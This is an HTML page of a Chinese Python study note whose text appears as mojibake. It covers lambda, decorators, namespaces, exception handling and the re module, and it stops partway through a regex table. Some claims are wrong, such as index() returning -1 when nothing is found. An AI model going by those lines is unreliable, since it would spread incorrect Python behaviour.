<p>ç®€å•ç†è§£å°±è¡Œï¼Œéœ€è¦æ—¶å†æŸ¥èµ„æ–™ <a href="https://mp.weixin.qq.com/s?src=11&timestamp=1581754981&ver=2159&signature=hkhJ1*BNkRYWZkGeuPQdEgSiYmtkW03-T4zD8ymfsQt6tEki73x*uiU0xb9*pyVNMRi5M4IkL87NEZyLGgn0p*SzwOXrNLbaQCNXTVGetGFFEtClIqR9muptV8VZx4bk&new=1">å‚è€ƒ</a></p>
<h5 id="åŒ¿åå‚æ•°lanbda"><a href="#åŒ¿åå‚æ•°lanbda" class="headerlink" title="åŒ¿åå‚æ•°lanbda()"></a>åŒ¿åå‚æ•°lanbda()</h5><p>è¿˜è®°å¾—é‚£ä¸ªéæ´²çš„è‹±è¯­è€å¸ˆæ•™å­¦ç”Ÿè¯»googleçš„è§†é¢‘å—ï¼Ÿè¿™éƒ¨åˆ†çš„å†…å®¹å°±ä»â€œå’•å™œå’•å™œâ€å¼€å§‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">African_eng_teacher = [<span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;gulugulu&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">accent</span>(<span class="params">word</span>):</span></span><br><span class="line">    <span class="keyword">return</span> word.title() + <span class="string">&#x27;!&#x27;</span> <span class="comment">#.title()çš„ä½œç”¨æ˜¯é¦–å­—æ¯å¤§å†™</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_google</span>(<span class="params">list_name, func</span>):</span> <span class="comment">#å°†å‡½æ•°ä½œä¸ºå‚æ•°è°ƒå…¥ï¼Œread_google(åˆ—è¡¨ï¼Œå‡½æ•°)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> list_name:</span><br><span class="line">        <span class="built_in">print</span>(func(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read_google(African_eng_teacher, accent)</span><br><span class="line">read_google(African_eng_teacher, <span class="keyword">lambda</span> word : word.title()+<span class="string">&#x27;!&#x27;</span>) <span class="comment">#lambdaåœ¨è¿™ç”¨äºå–ä»£accentå‡½æ•°</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;outs:</span></span><br><span class="line"><span class="string">G!</span></span><br><span class="line"><span class="string">O!</span></span><br><span class="line"><span class="string">O!</span></span><br><span class="line"><span class="string">G!</span></span><br><span class="line"><span class="string">L!</span></span><br><span class="line"><span class="string">E!</span></span><br><span class="line"><span class="string">Gulugulu!</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#ä¸¤æ¡è¯­å¥çš„è¾“å‡ºç»“æœç›¸åŒï¼Œå‡å¤§å£°çš„å¿µå‡ºäº†å’•å™œå’•å™œ</span></span><br></pre></td></tr></table></figure>



<h3 id="è£…é¥°å™¨"><a href="#è£…é¥°å™¨" class="headerlink" title="è£…é¥°å™¨"></a>è£…é¥°å™¨</h3><p>è£…é¥°å™¨çš„ä½œç”¨å°±æ˜¯åœ¨ä¸æ”¹å˜å·²æœ‰æºä»£ç çš„æƒ…å†µä¸‹ï¼Œä¿®æ”¹å·²ç»å­˜åœ¨çš„å‡½æ•°</p>
<p>è£…é¥°å™¨çš„ä¸€èˆ¬æ ¼å¼ï¼š</p>
<ol>
<li>*argså’Œ**kwargsï¼ˆä¸ªäººç†è§£æ˜¯argumentså’Œkeyword argumentsçš„æ„æ€ï¼Œä¸€ä¸ªå…ƒç»„ä¸€ä¸ªå­—å…¸ï¼‰</li>
<li>é—­åŒ…</li>
<li>ä½œä¸ºå‚æ•°çš„å‡½æ•°</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sqaure_it</span>(<span class="params">func</span>):</span>   <span class="comment">#æ­¤è£…é¥°å™¨çš„åŠŸèƒ½æ˜¯å¹³æ–¹è¿ç®—</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">new_function</span>(<span class="params">*args,**kwargs</span>):</span></span><br><span class="line">        result = func(*args,**kwargs)</span><br><span class="line">        <span class="keyword">return</span> result*result</span><br><span class="line">    <span class="keyword">return</span>  new_function</span><br><span class="line"></span><br><span class="line"><span class="meta">@sqaure_it            </span><span class="comment">#è£…é¥°å™¨å£°æ˜ï¼Œè¦åœ¨ä½¿ç”¨çš„å‡½æ•°ä¹‹å‰æ·»åŠ è£…é¥°å™¨çš„åå­—ï¼ˆæœªé€‰ä¸€èˆ¬æ ¼å¼3ï¼‰</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_number</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> a+b</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (add_number(<span class="number">3</span>,<span class="number">5</span>))</span><br><span class="line"><span class="comment">#outs : 64</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¦ä¸€ä¸ªä¾‹å­</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span>(<span class="params">func</span>):</span>                       <span class="comment">#è¯¥è£…é¥°å™¨å®ç°äº†å‡½æ•°ä¿¡æ¯çš„æ‰“å°</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">new_f</span>(<span class="params">*args, **kwargs</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;function name is:&#x27;</span>, func.__name__)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;add number is :&#x27;</span>, args)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;keyword arguments is&#x27;</span>, kwargs)</span><br><span class="line">        result = func(*args, **kwargs)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;sum is :&#x27;</span>, result)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> new_f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@info</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_number</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> a + b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add_number(<span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">outs:</span></span><br><span class="line"><span class="string">function name is: add_number</span></span><br><span class="line"><span class="string">add number is : (3, 4)</span></span><br><span class="line"><span class="string">keyword arguments is &#123;&#125;</span></span><br><span class="line"><span class="string">sum is : 7</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="å‘½åç©ºé—´å’Œä½œç”¨åŸŸ"><a href="#å‘½åç©ºé—´å’Œä½œç”¨åŸŸ" class="headerlink" title="å‘½åç©ºé—´å’Œä½œç”¨åŸŸ"></a>å‘½åç©ºé—´å’Œä½œç”¨åŸŸ</h3><ul>
<li>å±€éƒ¨å˜é‡å’Œå…¨å±€å˜é‡çš„åŒºåˆ«ï¼Œåœ¨å‡½æ•°ä¸­å¦‚æœæƒ³è¦è°ƒç”¨å…¨å±€å˜é‡éœ€è¦å…ˆå£°æ˜<code>global func_name</code>å†ç»™å…¨å±€å˜é‡é‡æ–°èµ‹å€¼</li>
<li>pyæä¾›äº†ä¸¤ä¸ªè·å–å‘½åç©ºé—´çš„å‡½æ•°<ul>
<li><code>locals()</code>è¿”å›ä¸€ä¸ªå±€éƒ¨å˜é‡çš„å­—å…¸</li>
<li><code>globals()</code>è¿”å›ä¸€ä¸ªå…¨å±€å˜é‡çš„å­—å…¸</li>
</ul>
</li>
</ul>
<h3 id="ä½¿ç”¨try-expecå¤„ç†å¼‚å¸¸"><a href="#ä½¿ç”¨try-expecå¤„ç†å¼‚å¸¸" class="headerlink" title="ä½¿ç”¨try-expecå¤„ç†å¼‚å¸¸"></a>ä½¿ç”¨try-expecå¤„ç†å¼‚å¸¸</h3><p>ä½¿ç”¨try-exceptä»£ç å—ï¼Œä¾èµ–äºtryæˆåŠŸæ‰§è¡Œåçš„ä»£ç æ”¾åœ¨elseä»£ç å—ä¸­</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">short_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>] </span><br><span class="line">position = <span class="number">5</span> </span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line">    	short_list[position]</span><br><span class="line"><span class="keyword">except</span>: </span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;Need a position between 0 and&#x27;</span>, <span class="built_in">len</span>(short_list)-<span class="number">1</span>, <span class="string">&#x27; but got&#x27;</span>, position)</span><br></pre></td></tr></table></figure>

<p>å¦ä¸€ä¸ªä¾‹å­</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    do something</span><br><span class="line"><span class="keyword">except</span> FileNotFoundError: <span class="comment">#æ–‡ä»¶ä¸å­˜åœ¨é”™è¯¯</span></span><br><span class="line">    <span class="keyword">pass</span> <span class="comment">#ä»€ä¹ˆéƒ½ä¸å¹²ï¼Œä¸æç¤ºé”™è¯¯</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    do something</span><br></pre></td></tr></table></figure>

<p>å¼‚å¸¸å¤„ç†å¤§åŒå°å¼‚ï¼Œéœ€è¦æ—¶å†æŸ¥é˜…èµ„æ–™</p>
<h3 id="æ­£åˆ™è¡¨è¾¾å¼"><a href="#æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼"></a>æ­£åˆ™è¡¨è¾¾å¼</h3><p><a href="https://segmentfault.com/a/1190000022242427">https://segmentfault.com/a/1190000022242427</a></p>
<p>æ­£åˆ™è¡¨è¾¾å¼çš„æ¨¡å¼ä¸²pattenå¯ä»¥åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†</p>
<p><code>å­—ç¬¦é›†ã€€æ•°é‡è¯</code></p>
<p><code>[]</code>è¡¨ç¤ºä¸€ä¸ªorå…³ç³»çš„å­—ç¬¦é›†,<code>[abc]</code>å°±æ˜¯è¡¨ç¤ºä¸€ä¸ªaæˆ–è€…bæˆ–è€…c</p>
<p>æ•°é‡è¯æ˜¯è·Ÿåœ¨å­—ç¬¦é›†åï¼Œè¡¨ç¤ºå‰é¢çš„å­—ç¬¦é›†å‡ºç°çš„æ¬¡æ•°æ¯”å¦‚<code>&#123;4,7&#125;</code>è¡¨ç¤ºå‰é¢çš„å­—ç¬¦ä¸²å‡ºç°ï¼”~7æ¬¡</p>
<ul>
<li>pyæœ‰ä¸€ä¸ªè‡ªå¸¦è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ä¸€ä¸ªå­—ç¬¦ä¸²å­—ä¸²çš„å‡½æ•°index()ä¼šè¿”å›æŸ¥è¯¢å­ä¸²åœ¨å­—ç¬¦ä¸²ä¸­çš„ä½ç½®ï¼Œå¦‚æœè¿”å›-1å°±æ˜¯æ²¡æ‰¾åˆ°</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a =<span class="string">&quot;1234454666&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.index(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.index(<span class="string">&quot;66&quot;</span>)</span><br><span class="line"><span class="number">7</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l <span class="keyword">in</span> a</span><br><span class="line"><span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯æ­£åˆ™è¡¨è¾¾å¼æ›´åŠ çªå‡ºçš„æ˜¯æ‰¾åˆ°åŒ¹é…æ¨¡å¼çš„å­—ç¬¦ä¸²</p>
<h4 id="findall"><a href="#findall" class="headerlink" title="findall"></a>findall</h4><p>åŒ¹é…æ‰€æœ‰çš„ç¬¦åˆè§„åˆ™ä¸²ï¼Œè¿”å›ä¸€ä¸ªlist</p>
<h3 id="1-æŸ¥æ‰¾ä¸€ä¸ªåŒ¹é…é¡¹"><a href="#1-æŸ¥æ‰¾ä¸€ä¸ªåŒ¹é…é¡¹" class="headerlink" title="1.æŸ¥æ‰¾ä¸€ä¸ªåŒ¹é…é¡¹"></a>1.æŸ¥æ‰¾ä¸€ä¸ªåŒ¹é…é¡¹</h3><p>æŸ¥æ‰¾å¹¶è¿”å›ä¸€ä¸ªåŒ¹é…é¡¹çš„å‡½æ•°æœ‰3ä¸ªï¼š<strong>searchã€matchã€fullmatch</strong>ï¼Œä»–ä»¬çš„åŒºåˆ«åˆ†åˆ«æ˜¯ï¼š</p>
<ol>
<li><strong>searchï¼š</strong> æŸ¥æ‰¾ä»»æ„ä½ç½®çš„åŒ¹é…é¡¹</li>
<li><strong>matchï¼š</strong> å¿…é¡»ä»å­—ç¬¦ä¸²å¼€å¤´åŒ¹é…</li>
<li><strong>fullmatchï¼š</strong> æ•´ä¸ªå­—ç¬¦ä¸²ä¸æ­£åˆ™å®Œå…¨åŒ¹é…</li>
</ol>
<h4 id="search-åŒ¹é…ä¸€ä¸ª"><a href="#search-åŒ¹é…ä¸€ä¸ª" class="headerlink" title="search(åŒ¹é…ä¸€ä¸ª)"></a>search(åŒ¹é…ä¸€ä¸ª)</h4><p>ä»ä»»æ„ä½ç½®å¼€å§‹åŒ¹é…ï¼Œè¿”å›ä¸€ä¸ª</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a=<span class="string">&quot;123&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>search =re.search(<span class="string">&quot;\d&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>search</span><br><span class="line">&lt;re.Match <span class="built_in">object</span>; span=(<span class="number">0</span>, <span class="number">1</span>), match=<span class="string">&#x27;1&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>search.group()</span><br><span class="line"><span class="string">&#x27;1&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿”å›çš„æ˜¯ä¸€ä¸ªreæ¨¡å—çš„åŒ¹é…å¯¹è±¡</p>
<h4 id="matchï¼ˆåŒ¹é…ä¸€ä¸ªï¼‰"><a href="#matchï¼ˆåŒ¹é…ä¸€ä¸ªï¼‰" class="headerlink" title="matchï¼ˆåŒ¹é…ä¸€ä¸ªï¼‰"></a>matchï¼ˆåŒ¹é…ä¸€ä¸ªï¼‰</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>match = re.match(<span class="string">&#x27;ll&#x27;</span>,<span class="string">&quot;l23333ll111&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºmatchå¿…é¡»ä»å¼€å¤´å¼€å§‹åŒ¹é…ï¼Œæ‰€ä»¥è¿™ä¸ªåŒ¹é…ä¸åˆ°å†…å®¹</p>
<p>ä»å­—ç¬¦ä¸²å¼€å¤´å¼€å§‹åŒ¹é…å­—ç¬¦ä¸²</p>
<h4 id="fullmatch"><a href="#fullmatch" class="headerlink" title="fullmatch"></a>fullmatch</h4><p>å®Œå…¨åŒ¹é…ï¼Œéœ€è¦å®Œå…¨åŒ¹é…</p>
<h4 id="è´ªå©ªåŒ¹é…å’Œéè´ªå©ªåŒ¹é…"><a href="#è´ªå©ªåŒ¹é…å’Œéè´ªå©ªåŒ¹é…" class="headerlink" title="è´ªå©ªåŒ¹é…å’Œéè´ªå©ªåŒ¹é…"></a>è´ªå©ªåŒ¹é…å’Œéè´ªå©ªåŒ¹é…</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">a = <span class="string">&#x27;java*&amp;39android##@@python&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># éè´ªå©ª</span></span><br><span class="line"></span><br><span class="line">re_findall1 = re.findall(<span class="string">&#x27;[a-z]&#123;4,7&#125;?&#x27;</span>, a)</span><br><span class="line"><span class="built_in">print</span>(re_findall1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è´ªå©ª</span></span><br><span class="line">re_findall2 = re.findall(<span class="string">&#x27;[a-z]&#123;4,7&#125;&#x27;</span>, a)</span><br><span class="line"><span class="built_in">print</span>(re_findall2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡º</span></span><br><span class="line">[<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;andr&#x27;</span>, <span class="string">&#x27;pyth&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;android&#x27;</span>, <span class="string">&#x27;python&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>åŠ äº†é—®å·å°±æ˜¯éè´ªå©ªäº†</p>
<h3 id="2-æŸ¥æ‰¾å¤šä¸ªåŒ¹é…é¡¹"><a href="#2-æŸ¥æ‰¾å¤šä¸ªåŒ¹é…é¡¹" class="headerlink" title="2.æŸ¥æ‰¾å¤šä¸ªåŒ¹é…é¡¹"></a>2.æŸ¥æ‰¾å¤šä¸ªåŒ¹é…é¡¹</h3><p>è®²å®ŒæŸ¥æ‰¾ä¸€é¡¹ï¼Œç°åœ¨æ¥çœ‹çœ‹æŸ¥æ‰¾å¤šé¡¹å§ï¼ŒæŸ¥æ‰¾å¤šé¡¹å‡½æ•°ä¸»è¦æœ‰ï¼š<strong>findallå‡½æ•°</strong> ä¸ <strong>finditerå‡½æ•°</strong>ï¼š</p>
<ol>
<li><strong>findallï¼š</strong> ä»å­—ç¬¦ä¸²ä»»æ„ä½ç½®æŸ¥æ‰¾ï¼Œ<strong>è¿”å›ä¸€ä¸ªåˆ—è¡¨</strong></li>
<li><strong>finditer</strong>ï¼šä»å­—ç¬¦ä¸²ä»»æ„ä½ç½®æŸ¥æ‰¾ï¼Œ<strong>è¿”å›ä¸€ä¸ªè¿­ä»£å™¨</strong></li>
</ol>
<p>ä¸¤ä¸ªæ–¹æ³•åŸºæœ¬ç±»ä¼¼ï¼Œåªä¸è¿‡ä¸€ä¸ªæ˜¯è¿”å›åˆ—è¡¨ï¼Œä¸€ä¸ªæ˜¯è¿”å›è¿­ä»£å™¨ã€‚æˆ‘ä»¬çŸ¥é“åˆ—è¡¨æ˜¯ä¸€æ¬¡æ€§ç”Ÿæˆåœ¨å†…å­˜ä¸­ï¼Œè€Œè¿­ä»£å™¨æ˜¯éœ€è¦ä½¿ç”¨æ—¶ä¸€ç‚¹ä¸€ç‚¹ç”Ÿæˆå‡ºæ¥çš„ï¼Œå†…å­˜ä½¿ç”¨æ›´ä¼˜ã€‚</p>
<h3 id="3-æ›¿æ¢"><a href="#3-æ›¿æ¢" class="headerlink" title="3.æ›¿æ¢"></a>3.æ›¿æ¢</h3><p>æ›¿æ¢ä¸»è¦æœ‰<strong>subå‡½æ•°</strong> ä¸ <strong>subnå‡½æ•°</strong>ï¼Œä»–ä»¬åŠŸèƒ½ç±»ä¼¼ï¼</p>
<p>å…ˆæ¥çœ‹çœ‹<strong>subå‡½æ•°</strong>çš„ç”¨æ³•ï¼š</p>
<p><strong>re.sub(pattern, repl, string, count=0, flags=0)</strong> å‡½æ•°å‚æ•°è®²è§£ï¼šreplæ›¿æ¢æ‰stringä¸­è¢«patternåŒ¹é…çš„å­—ç¬¦ï¼Œ countè¡¨ç¤ºæœ€å¤§æ›¿æ¢æ¬¡æ•°ï¼Œflagsè¡¨ç¤ºæ­£åˆ™è¡¨è¾¾å¼çš„å¸¸é‡ã€‚</p>
<p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼š<strong>subå‡½æ•°</strong>ä¸­çš„å…¥å‚ï¼š<strong>replæ›¿æ¢å†…å®¹æ—¢å¯ä»¥æ˜¯å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªå‡½æ•°å“¦ï¼</strong> å¦‚æœreplä¸ºå‡½æ•°æ—¶ï¼Œåªèƒ½æœ‰ä¸€ä¸ªå…¥å‚ï¼šMatchåŒ¹é…å¯¹è±¡ã€‚</p>
<h3 id="4-åˆ‡å‰²"><a href="#4-åˆ‡å‰²" class="headerlink" title="4.åˆ‡å‰²"></a>4.åˆ‡å‰²</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.split(<span class="string">&quot;\.&quot;</span>,<span class="string">&quot;www.pornhub.com&quot;</span>)</span><br><span class="line">[<span class="string">&#x27;www&#x27;</span>, <span class="string">&#x27;pornhub&#x27;</span>, <span class="string">&#x27;com&#x27;</span>]</span><br><span class="line"><span class="comment"># å¯ä»¥ç”¨äºåˆ‡å‰²å­—ç¬¦ä¸²å¹¶ä¸”è¿”å›ä¸€ä¸ªåˆ—è¡¨</span></span><br></pre></td></tr></table></figure>





<h4 id="è¡¨è¾¾å¼å…¨é›†"><a href="#è¡¨è¾¾å¼å…¨é›†" class="headerlink" title="è¡¨è¾¾å¼å…¨é›†"></a>è¡¨è¾¾å¼å…¨é›†</h4><table>
<thead>
<tr>
<th align="center">å­—ç¬¦</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td align="center">\</td>
<td>å°†ä¸‹ä¸€ä¸ªå­—ç¬¦æ ‡è®°ä¸ºä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ã€æˆ–ä¸€ä¸ªåŸä¹‰å­—ç¬¦ã€æˆ–ä¸€ä¸ªå‘åå¼•ç”¨ã€æˆ–ä¸€ä¸ªå…«è¿›åˆ¶è½¬ä¹‰ç¬¦ã€‚ä¾‹å¦‚ï¼Œâ€œ<code>n</code>â€åŒ¹é…å­—ç¬¦â€œ<code>n</code>â€ã€‚â€œ<code>\n</code>â€åŒ¹é…ä¸€ä¸ªæ¢è¡Œç¬¦ã€‚ä¸²è¡Œâ€œ<code>\\</code>â€åŒ¹é…â€œ<code>\</code>â€è€Œâ€œ<code>\(</code>â€åˆ™åŒ¹é…â€œ<code>(</code>â€ã€‚</td>
</tr>
<tr>
<td align="center">^</td>
<td>åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®ã€‚å¦‚æœè®¾ç½®äº†RegExpå¯¹è±¡çš„Multilineå±æ€§ï¼Œ^ä¹ŸåŒ¹é…â€œ<code>\n</code>â€æˆ–â€œ<code>\r</code>â€ä¹‹åçš„ä½ç½®ã€‚</td>
</tr>
<tr>
<td align="center">$</td>
<td>åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„ç»“æŸä½ç½®ã€‚å¦‚æœè®¾ç½®äº†RegExpå¯¹è±¡çš„Multilineå±æ€§ï¼Œ$ä¹ŸåŒ¹é…â€œ<code>\n</code>â€æˆ–â€œ<code>\r</code>â€ä¹‹å‰çš„ä½ç½®ã€‚</td>
</tr>
<tr>
<td align="center">*</td>
<td>åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–å¤šæ¬¡ã€‚ä¾‹å¦‚ï¼Œzo<em>èƒ½åŒ¹é…â€œ<code>z</code>â€ä»¥åŠâ€œ<code>zoo</code>â€ã€‚</em>ç­‰ä»·äº{0,}ã€‚</td>
</tr>
<tr>
<td align="center">+</td>
<td>åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€œ<code>zo+</code>â€èƒ½åŒ¹é…â€œ<code>zo</code>â€ä»¥åŠâ€œ<code>zoo</code>â€ï¼Œä½†ä¸èƒ½åŒ¹é…â€œ<code>z</code>â€ã€‚+ç­‰ä»·äº{1,}ã€‚</td>
</tr>
<tr>
<td align="center">?</td>
<td>åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–ä¸€æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€œ<code>do(es)?</code>â€å¯ä»¥åŒ¹é…â€œ<code>does</code>â€æˆ–â€œ<code>does</code>â€ä¸­çš„â€œ<code>do</code>â€ã€‚?ç­‰ä»·äº{0,1}ã€‚</td>
</tr>
<tr>
<td align="center">{<em>n</em>}</td>
<td><em>n</em>æ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ã€‚åŒ¹é…ç¡®å®šçš„<em>n</em>æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€œ<code>o&#123;2&#125;</code>â€ä¸èƒ½åŒ¹é…â€œ<code>Bob</code>â€ä¸­çš„â€œ<code>o</code>â€ï¼Œä½†æ˜¯èƒ½åŒ¹é…â€œ<code>food</code>â€ä¸­çš„ä¸¤ä¸ªoã€‚</td>
</tr>
<tr>
<td align="center">{<em>n</em>,}</td>
<td><em>n</em>æ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ã€‚è‡³å°‘åŒ¹é…<em>n</em>æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€œ<code>o&#123;2,&#125;</code>â€ä¸èƒ½åŒ¹é…â€œ<code>Bob</code>â€ä¸­çš„â€œ<code>o</code>â€ï¼Œä½†èƒ½åŒ¹é…â€œ<code>foooood</code>â€ä¸­çš„æ‰€æœ‰oã€‚â€œ<code>o&#123;1,&#125;</code>â€ç­‰ä»·äºâ€œ<code>o+</code>â€ã€‚â€œ<code>o&#123;0,&#125;</code>â€åˆ™ç­‰ä»·äºâ€œ<code>o*</code>â€ã€‚</td>
</tr>
<tr>
<td align="center">{<em>n</em>,<em>m</em>}</td>
<td><em>m</em>å’Œ<em>n</em>å‡ä¸ºéè´Ÿæ•´æ•°ï¼Œå…¶ä¸­<em>n</em>&lt;=<em>m</em>ã€‚æœ€å°‘åŒ¹é…<em>n</em>æ¬¡ä¸”æœ€å¤šåŒ¹é…<em>m</em>æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€œ<code>o&#123;1,3&#125;</code>â€å°†åŒ¹é…â€œ<code>fooooood</code>â€ä¸­çš„å‰ä¸‰ä¸ªoã€‚â€œ<code>o&#123;0,1&#125;</code>â€ç­‰ä»·äºâ€œ<code>o?</code>â€ã€‚è¯·æ³¨æ„åœ¨é€—å·å’Œä¸¤ä¸ªæ•°ä¹‹é—´ä¸èƒ½æœ‰ç©ºæ ¼ã€‚</td>
</tr>
<tr>
<td align="center">?</td>
<td>å½“è¯¥å­—ç¬¦ç´§è·Ÿåœ¨ä»»ä½•ä¸€ä¸ªå…¶ä»–é™åˆ¶ç¬¦ï¼ˆ*,+,?ï¼Œ{<em>n</em>}ï¼Œ{<em>n</em>,}ï¼Œ{<em>n</em>,<em>m</em>}ï¼‰åé¢æ—¶ï¼ŒåŒ¹é…æ¨¡å¼æ˜¯éè´ªå©ªçš„ã€‚éè´ªå©ªæ¨¡å¼å°½å¯èƒ½å°‘çš„åŒ¹é…æ‰€æœç´¢çš„å­—ç¬¦ä¸²ï¼Œè€Œé»˜è®¤çš„è´ªå©ªæ¨¡å¼åˆ™å°½å¯èƒ½å¤šçš„åŒ¹é…æ‰€æœç´¢çš„å­—ç¬¦ä¸²ã€‚ä¾‹å¦‚ï¼Œå¯¹äºå­—ç¬¦ä¸²â€œ<code>oooo</code>â€ï¼Œâ€œ<code>o+?</code>â€å°†åŒ¹é…å•ä¸ªâ€œ<code>o</code>â€ï¼Œè€Œâ€œ<code>o+</code>â€å°†åŒ¹é…æ‰€æœ‰â€œ<code>o</code>â€ã€‚</td>
</tr>
<tr>
<td align="center">.</td>
<td>åŒ¹é…é™¤â€œ<code>\</code>*<code>n</code><em>â€ä¹‹å¤–çš„ä»»ä½•å•ä¸ªå­—ç¬¦ã€‚è¦åŒ¹é…åŒ…æ‹¬â€œ<code>\</code></em><code>n</code>*â€åœ¨å†…çš„ä»»ä½•å­—ç¬¦ï¼Œè¯·ä½¿ç”¨åƒâ€œ`(.</td>
</tr>
<tr>
<td align="center">(pattern)</td>
<td>åŒ¹é…patternå¹¶è·å–è¿™ä¸€åŒ¹é…ã€‚æ‰€è·å–çš„åŒ¹é…å¯ä»¥ä»äº§ç”Ÿçš„Matchesé›†åˆå¾—åˆ°ï¼Œåœ¨VBScriptä¸­ä½¿ç”¨SubMatchesé›†åˆï¼Œåœ¨JScriptä¸­åˆ™ä½¿ç”¨$0â€¦$9å±æ€§ã€‚è¦åŒ¹é…åœ†æ‹¬å·å­—ç¬¦ï¼Œè¯·ä½¿ç”¨â€œ<code>\(</code>â€æˆ–â€œ<code>\)</code>â€ã€‚</td>
</tr>
<tr>
<td align="center">(?:pattern)</td>
<td>åŒ¹é…patternä½†ä¸è·å–åŒ¹é…ç»“æœï¼Œä¹Ÿå°±æ˜¯è¯´è¿™æ˜¯ä¸€ä¸ªéè·å–åŒ¹é…ï¼Œä¸è¿›è¡Œå­˜å‚¨ä¾›ä»¥åä½¿ç”¨ã€‚è¿™åœ¨ä½¿ç”¨æˆ–å­—ç¬¦â€œ`(</td>
